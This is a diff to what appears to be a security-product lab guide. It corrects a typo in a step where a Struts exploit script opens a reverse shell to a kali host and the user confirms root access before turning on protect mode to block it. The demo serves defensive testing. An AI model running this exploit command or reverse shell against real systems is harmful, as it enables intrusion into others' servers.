@@ -44,6 +44,6 @@ python3 /payloads/struts-pwn2.py --exploit --url 'http://URL/super-app/orders/3'
 where `X.X.X.X` is the IP to the kali service you got in step 4
 and the URL is the HOSTS of struts-orders ingress `kubectl get ingress struts-orders`
 
-7. In the recerse shell type some commands, like prove you are root with `whoami`
+7. In the reverse shell type some commands, like prove you are root with `whoami`
 
 8. Put the policy group `nv.struts-orders.default` in protect mode and see that it is now protected and it's no longer possible to execute commands in the reversed shell
